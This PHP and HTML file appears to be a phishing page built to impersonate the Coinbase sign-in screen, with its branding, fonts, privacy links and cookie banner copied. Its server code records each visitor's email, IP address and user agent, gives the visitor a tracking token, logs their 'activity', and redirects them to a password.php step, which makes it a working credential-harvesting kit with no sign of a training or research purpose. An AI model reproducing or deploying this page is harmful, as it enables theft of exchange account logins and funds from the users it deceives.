<?php
// Start the session with secure settings
session_start([
    'cookie_lifetime' => 0, // Session expires when browser closes
    'cookie_secure' => true,    // Only send cookie over HTTPS
    'cookie_httponly' => true, // Prevent JavaScript access to session cookie
    'cookie_samesite' => 'Lax', // CSRF protection
    'use_strict_mode' => true,  // Prevents session fixation
    'use_only_cookies' => 1,    // Only use cookies for session
    'sid_length' => 128,        // Strong session ID length
    'sid_bits_per_character' => 6 // More entropy
]);

// Include the database connection file
require_once "admin/db_connection.php";

// Function to generate a random token
function generateToken() {
    return bin2hex(random_bytes(16)); // 16 bytes gives a 32 character long token
}

// Function to get the user's IP address
function getUserIP() {
    $ip = '';
    // Check for shared Internet/ISP IP
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    // Check for IP address from a proxy
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 
    // Check for the remote IP address
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Function to get the user agent
function getUserAgent() {
    return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
}

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the email submitted in the form
    $email = isset($_POST["email"]) ? $_POST["email"] : '';

    // Get the user's IP address
    $ip_address = getUserIP();

    // Get the user agent
    $user_agent = getUserAgent();
    
    // Generate a token
    $token = generateToken();

    // Store the email, IP address, user agent, and token in the database using prepared statements
    $stmt = $conn->prepare("INSERT INTO user_submissions (email, ip_address, user_agent, token) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $email, $ip_address, $user_agent, $token);
    if ($stmt->execute()) {
        // Email address, IP address, user agent, and token stored successfully
        // Proceed to password.php or any other desired page
        $_SESSION["email"] = $email;
        $_SESSION["token"] = $token;
        // Update user activity to indicate login page
        updateActivity($token, "LoginPage");
        header("Location: password.php");
        exit();
    } else {
        // Error storing data in the database
        echo "Error: " . $conn->error;
    }
    $stmt->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Sign In</title>
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2'), /* Modern Browsers */
                 url('path/to/CoinbaseSans.woff') format('woff'); /* Legacy Browsers */
            font-weight: normal; /* Specify font weight if necessary */
            font-style: normal; /* Specify font style if necessary */
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #0A0B0D;
            color: #E0E0E0;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
        }

        h4 {
            margin: 0;
            padding: 20px 0;
            background-color: #000763;
            color: white;
            font-family: arial;
            text-align: center;
        }

        .wrapper {
            display: flex;
            justify-content: center;
            min-height: 60vh;
        }

        .login-container {
            width: 80%;
            max-width: 400px;
            padding: 20px;
            border-radius: 16px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            background-color: #0A0B0D;
            margin-top: 10px; /* Removed margin-top */
        }

        .login-image {
            width: 30px;
            margin-top: 20px;
            margin-left: 20px;
        }

        h2 {
            font-size: 28px;
            font-weight: 600;
        }

        .login-form {
            margin-top:15px;
        }

        .login-form h2 {
            margin-left: 20px;
            margin-bottom: 0;
        }

        .login-form p {
            color: #B0B0B0;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            margin-left: 20px;
            margin-top: 10px;
            width: 100%;
        }

        .login-form label {
            color: #E0E0E0;
            font-size: 14px;
            font-weight: bold;
            display: block;
            margin-left: 20px;
            margin-bottom: 5px;
        }

        .login-form input {
            appearance: none;
            background-color: #0A0B0D;
            border: 2px solid rgba(91, 97, 110, 0.2);
            border-radius: 8px;
            box-sizing: border-box;
            color: #E0E0E0;
            display: flex;
            flex-grow: 2;
            margin-bottom: 20px;
            margin-left: 20px;
            min-width: 0;
            padding: 16px;
            transition: border-color 0.3s ease-in-out;
            width: 90%;
        }

        .login-form input:focus {
            outline: none;
            border-color: #1E90FF;
            background-color: #0A0B0D;
        }

        .login-form input:hover {
            outline: none;
            border-color: #1E90FF;
            background-color: #0F1012;
        }

        .login-form input::placeholder {
            color: #B0B0B0;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-size: 15px;
            opacity: 1;
        }

        .login-form button[type="submit"] {
            background-color: #588BFA;
            border: none;
            border-radius: 50px;
            color: black;
            cursor: pointer;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            margin-left: 20px;
            padding: 16px;
            width: 90%;
            margin-bottom: 20px;
        }

        .login-form button:hover {
            background-color: #1C7CD6;
        }

        .login-links {
            text-align: center;
            margin-bottom: 15px;
        }

        .login-links a {
            display: block;
            margin: 5px;
            color: #1E90FF;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .grey-button {
            display: flex;
            align-items: center;
            justify-content: space-between; /* Distribute space between items */
            background-color: #32353D;
            border: none;
            border-radius: 50px;
            color: #fff;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            line-height: 24px;
            margin-left: 20px;
            padding: 16px;
            width: 90%;
            margin-bottom: 10px;
        }

        .grey-button span {
            flex-grow: 1; /* Allow the text to take up remaining space */
            text-align: left; /* Ensure text is aligned to the left */
        }

        .grey-button:hover {
            background-color: #333;
        }

        .clear-button {
            background-color: #0A0B0D;
            border: none;
            border-radius: 24px;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            padding: 10px;
            margin-top: 20px;
        }

        .clear-button:hover {
            background-color: #1a1a1a;
        }

        .top-button {
            background-color: #32353D;
            border: none;
            border-radius: 24px;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            padding: 10px;
            margin-top: 20px;
        }

        .top-button:hover {
            background-color: #333;
        }

        .wrapper2 {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px; /* Added padding for better spacing */
        }

        #cookie-banner {
  width: 100%;
  background-color: #f3f4f6;
  padding: 10px;
  position: fixed;
  bottom: 0;
  left: 0;
  z-index: 9999;
  box-shadow: 0 -4px 6px rgba(0, 0, 0, 0.1);
}

#cookie-banner p {
  margin: 0;
  font-size: 14px;
  color: #4a4a4a;
}

#cookie-banner a {
  color: #4a90e2;
}

#dismiss-button {
  background-color: #4a90e2;
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 20px;
  cursor: pointer;
}


    </style>
</head>
<body>
<!--<h4>Don’t invest unless you’re prepared to lose all the money you invest. This is a high-risk investment and you should not expect to be protected if something goes wrong. <a href="https://www.coinbase.com/en-gb/uk-fca-info">Take 2 mins to learn more</a></h4> -->
<div class="wrapper2">
    <img src="https://assets.ifttt.com/images/channels/1358877763/icons/monochrome_large.png" alt="Coinbase Logo" class="login-image" href="https://coinbase.com">
    <div>
        <button class="clear-button">Sign up</button>
        <button class="top-button">Sign in to business</button>
    </div>
</div>
<div class="wrapper">
    <div class="login-container">
        <form class="login-form" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <h2>Sign in to Coinbase</h2><br>
            <label for="email">Email</label>
            <input type="email" id="email" name="email" placeholder="Your email address" required>
            <button type="submit">Continue</button>
        </form>
        <hr>
        <br>
        <button class="grey-button">
            <span>Sign in with Passkey</span>
            <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5.37256 0.93801C4.02536 1.22585 2.8994 2.35696 2.55569 3.75968C2.43717 4.24618 2.43717 5.05701 2.55569 5.5435C2.90335 6.9665 4.02141 8.07328 5.40417 8.36518C5.62936 8.41383 5.8506 8.42599 6.30098 8.41383C6.80668 8.39356 6.941 8.37734 7.22941 8.28004C8.02746 8.01652 8.62007 7.59489 9.08625 6.95434C9.38256 6.55298 9.56429 6.18405 9.70652 5.71783C9.80529 5.38944 9.81319 5.30836 9.81319 4.65159C9.81319 3.99482 9.80529 3.91374 9.70652 3.58536C9.3312 2.33668 8.45809 1.43261 7.22941 1.02315C6.92915 0.921793 6.82643 0.909631 6.26148 0.897468C5.83875 0.88936 5.54639 0.901522 5.37256 0.93801Z" fill="white"></path><path d="M12.5633 5.55967C11.9983 5.68129 11.5045 5.96508 11.0817 6.41509C10.2995 7.23808 10.0625 8.4908 10.4891 9.56515C10.7064 10.1165 11.1963 10.6922 11.6862 10.976L11.9272 11.1179L11.9312 13.3882V15.6585L12.5356 16.2747L13.1401 16.895L14.1633 15.8409L15.1905 14.7869L14.5781 14.1585L13.9658 13.5301L14.5702 12.9098C14.8982 12.5693 15.1708 12.2733 15.1708 12.253C15.1708 12.2328 14.9535 11.9895 14.6888 11.7179C14.4241 11.4463 14.2147 11.2152 14.2226 11.2071C14.2344 11.199 14.3846 11.1138 14.5584 11.0125C15.2142 10.6395 15.7397 9.94218 15.9214 9.20839C16.0162 8.8273 16.0281 8.11782 15.9411 7.75295C15.7081 6.73131 14.9021 5.884 13.8986 5.60021C13.5944 5.51507 12.8754 5.4948 12.5633 5.55967ZM13.6023 6.90564C13.7959 7.04348 13.9855 7.38808 13.9855 7.607C13.9855 7.81377 13.8196 8.15026 13.6576 8.27594C13.4759 8.41783 13.148 8.48675 12.9386 8.42999C12.5988 8.33269 12.3302 7.97593 12.3262 7.61917C12.3223 6.94618 13.069 6.52861 13.6023 6.90564Z" fill="white"></path><path d="M4.16802 9.78411C2.34279 10.0719 0.809901 11.4098 0.233093 13.218C0.0355566 13.8423 0 14.1585 0 15.3585V16.4491H5.33349H10.667V14.1382V11.8274L10.3509 11.5193C9.99536 11.1706 9.71486 10.7976 9.51337 10.4084L9.37904 10.1449L8.94446 9.99492C8.23728 9.75167 7.90147 9.71924 6.09993 9.72329C4.97397 9.72735 4.42087 9.74356 4.16802 9.78411Z" fill="white"></path></svg>
        </button>
        <button class="grey-button">
            <span>Sign in with Google</span>
            <svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z" fill="white"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z" fill="white"></path></svg>
        </button>
        <button class="grey-button">
            <span>Sign in with Apple</span>
            <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_1022_155)"><path d="M14.1869 13.1777C13.955 13.7134 13.6805 14.2065 13.3625 14.6599C12.929 15.2779 12.5741 15.7057 12.3006 15.9433C11.8765 16.3332 11.4222 16.533 10.9357 16.5443C10.5865 16.5443 10.1653 16.4449 9.67504 16.2433C9.18315 16.0427 8.73112 15.9433 8.31779 15.9433C7.88431 15.9433 7.4194 16.0427 6.92212 16.2433C6.42409 16.4449 6.02288 16.55 5.71613 16.5604C5.24961 16.5803 4.78461 16.3749 4.32046 15.9433C4.02421 15.6849 3.65367 15.242 3.20977 14.6145C2.73351 13.9444 2.34195 13.1673 2.0352 12.2814C1.70668 11.3245 1.54199 10.3979 1.54199 9.50085C1.54199 8.47326 1.76403 7.58699 2.20878 6.84429C2.55832 6.24773 3.02332 5.77714 3.6053 5.43168C4.18729 5.08622 4.81613 4.91017 5.49333 4.89891C5.86387 4.89891 6.34979 5.01353 6.95364 5.23879C7.55579 5.46481 7.94242 5.57942 8.11194 5.57942C8.23867 5.57942 8.66818 5.4454 9.3963 5.17822C10.0849 4.93043 10.666 4.82783 11.1421 4.86825C12.4321 4.97236 13.4013 5.4809 14.0459 6.39708C12.8921 7.09615 12.3214 8.07527 12.3327 9.33134C12.3431 10.3097 12.6981 11.1239 13.3956 11.7703C13.7117 12.0703 14.0648 12.3022 14.4576 12.4669C14.3724 12.7139 14.2825 12.9506 14.1869 13.1777ZM11.2282 1.53515C11.2282 2.30199 10.948 3.01799 10.3896 3.68071C9.71574 4.46855 8.90063 4.9238 8.01672 4.85197C8.00546 4.75997 7.99893 4.66314 7.99893 4.5614C7.99893 3.82523 8.3194 3.03739 8.88852 2.39322C9.17265 2.06706 9.53401 1.79587 9.97223 1.57954C10.4095 1.36643 10.8231 1.24858 11.2121 1.22839C11.2235 1.33091 11.2282 1.43343 11.2282 1.53514V1.53515Z" fill="white"></path></g><defs><clipPath id="clip0_1022_155"><rect width="16" height="16" fill="white" transform="translate(0 0.89502)"></rect></clipPath></defs></svg>
        </button>
        <button class="grey-button">
            <span>Sign in with Wallet</span>
            <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5.37256 0.93801C4.02536 1.22585 2.8994 2.35696 2.55569 3.75968C2.43717 4.24618 2.43717 5.05701 2.55569 5.5435C2.90335 6.9665 4.02141 8.07328 5.40417 8.36518C5.62936 8.41383 5.8506 8.42599 6.30098 8.41383C6.80668 8.39356 6.941 8.37734 7.22941 8.28004C8.02746 8.01652 8.62007 7.59489 9.08625 6.95434C9.38256 6.55298 9.56429 6.18405 9.70652 5.71783C9.80529 5.38944 9.81319 5.30836 9.81319 4.65159C9.81319 3.99482 9.80529 3.91374 9.70652 3.58536C9.3312 2.33668 8.45809 1.43261 7.22941 1.02315C6.92915 0.921793 6.82643 0.909631 6.26148 0.897468C5.83875 0.88936 5.54639 0.901522 5.37256 0.93801Z" fill="white"></path><path d="M12.5633 5.55967C11.9983 5.68129 11.5045 5.96508 11.0817 6.41509C10.2995 7.23808 10.0625 8.4908 10.4891 9.56515C10.7064 10.1165 11.1963 10.6922 11.6862 10.976L11.9272 11.1179L11.9312 13.3882V15.6585L12.5356 16.2747L13.1401 16.895L14.1633 15.8409L15.1905 14.7869L14.5781 14.1585L13.9658 13.5301L14.5702 12.9098C14.8982 12.5693 15.1708 12.2733 15.1708 12.253C15.1708 12.2328 14.9535 11.9895 14.6888 11.7179C14.4241 11.4463 14.2147 11.2152 14.2226 11.2071C14.2344 11.199 14.3846 11.1138 14.5584 11.0125C15.2142 10.6395 15.7397 9.94218 15.9214 9.20839C16.0162 8.8273 16.0281 8.11782 15.9411 7.75295C15.7081 6.73131 14.9021 5.884 13.8986 5.60021C13.5944 5.51507 12.8754 5.4948 12.5633 5.55967ZM13.6023 6.90564C13.7959 7.04348 13.9855 7.38808 13.9855 7.607C13.9855 7.81377 13.8196 8.15026 13.6576 8.27594C13.4759 8.41783 13.148 8.48675 12.9386 8.42999C12.5988 8.33269 12.3302 7.97593 12.3262 7.61917C12.3223 6.94618 13.069 6.52861 13.6023 6.90564Z" fill="white"></path><path d="M4.16802 9.78411C2.34279 10.0719 0.809901 11.4098 0.233093 13.218C0.0355566 13.8423 0 14.1585 0 15.3585V16.4491H5.33349H10.667V14.1382V11.8274L10.3509 11.5193C9.99536 11.1706 9.71486 10.7976 9.51337 10.4084L9.37904 10.1449L8.94446 9.99492C8.23728 9.75167 7.90147 9.71924 6.09993 9.72329C4.97397 9.72735 4.42087 9.74356 4.16802 9.78411Z" fill="white"></path></svg>
        </button><br>
        <center><p style="font-size: 0.8em; color: grey" class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-break-b8plbaq">Not your device? Use a private window.<br>See our <a data-testid="link-privacy-policy" class="cds-link cds-link-l17zyfmx" href="https://www.coinbase.com/legal/privacy" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-noUnderline-njp1bsq cds-link--container">Privacy Policy</span></a> for more info.</p></center>
    </div>
    
</div>
<div id="cookie-banner" style="width: 100%; background-color: #141519; padding: 10px; position: fixed; bottom: 0; left: 0; z-index: 9999; box-shadow: 0 -4px 6px rgba(0,0,0,0.1);">
  <div style="max-width: 800px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center;">
    <p style="margin: 0; font-size: 14px; color: white;">
      We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our 
      <a href="https://coinbase.com/legal/cookie" target="_blank" style="color: #4a90e2;">Cookie Policy</a>.
    </p>
    <button id="dismiss-button" style="background-color: #4a90e2; color: #fff; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">Dismiss</button>
  </div>
</div>

</body>
<script>
  document.getElementById("dismiss-button").addEventListener("click", function() {
    document.getElementById("cookie-banner").style.display = "none";
    localStorage.setItem("cookieConsent", "true");
  });

  window.onload = function() {
    if (localStorage.getItem("cookieConsent") === "true") {
      document.getElementById("cookie-banner").style.display = "none";
    }
  };
</script>

</html>
